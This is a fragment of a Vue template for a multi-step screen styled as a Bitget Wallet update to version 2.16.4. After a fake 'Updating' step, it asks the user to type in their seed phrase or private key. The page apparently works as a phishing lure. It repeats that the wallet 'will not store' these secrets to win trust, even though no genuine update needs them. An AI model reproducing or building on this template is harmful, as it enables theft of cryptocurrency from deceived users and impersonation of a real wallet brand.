        ...
        <div :key="currentStep">
          ...
          <template v-if="currentStep === 1">
            <div class="flex flex-col items-center justify-center">
              ...
              <form class="w-full p-6">
                ...
                <div class="mb-2">
                  <label class="text-white text-[14px] font-medium mb-2" for=""
          ...
          <template v-else-if="currentStep === 2">
            ...
            <p class="text-gray-500 font-semibold text-center text-2xl mb-8">
              Supports the svmBNB mainnet
Resolved known issues, enhancing plug-in stability and user experience
            </p>
            ...
            <div key="s3" class="flex flex-col items-center p-6">
              <div class="flex flex-col items-center gap-3 py-6 w-full">
                ...
                <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">
                  ...
                  Updating Bitget Wallet
                </h2>
                <p class="text-gray-300 text-[16px] text-center">
                  
                        Please wait while we update to version 2.16.4
                </p>
                ...
                <p class="text-gray-300 text-[14px] leading-8 text-center mt-4 text-center">
            ...
            <div key="s4" class="flex flex-col w-full p-6">
              ...
              <div style="border: 2px solid #222222;" class="flex mb-4 bg-black rounded-[30px] flex p-2 space-x-3">
                <button
                  ...
                  :class="[
                    'flex-1 text-white rounded-[30px] py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
              ...
              <div v-if="activeTab === 'seed'">
                ...
                <div class="mb-6 relative flex items-center space-x-1 my-[20px]">
                  ...
                  <div class="relative flex space-x-1 mr-2">
                    ...
                    <select
                      ...
                      class="w-full bg-red-500 font-bold text-xl bg-white rounded-lg text-gray-700 appearance-none cursor-pointer focus:outline-none focus:border-[#0376c9] focus:ring-2 focus:ring-blue-200"
                    >
                    ...
                    >
                      ...
                      <div class="relative">
                        <input
                          ...
                          style="background: #23262F; padding-left: 30px; border-radius: 0px;"
                          class="w-full border-none py-3 pl-10 pr-10 text-white text-sm outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                        />
                ...
                <p class="mt-[20px] leading-8 text-[13px] font-semibold">Supports importing mnemonic phrases and private keys. Bitget Wallet will not store your mnemonic phrases and private keys</p>
                ...
                <div class="flex gap-3 mt-[30px]">
                  <button
                    ...
                    class="flex-1 font-bold bg-white text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-white text-black py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Confirm
                  </button>
                </div>
              ...
              <div v-else-if="activeTab === 'private'">
                ...
                style="background: #23262f; font-size: 14px"
                  class="w-full border border-gray-300 rounded-lg py-3 px-4 text-white text-base outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 resize-none"
                ></textarea>

                <p class="mt-[90px] text-[14px] font-semibold leading-8">Supports importing mnemonic phrases and private keys. Bitget Wallet will not store your mnemonic phrases and private keys</p>
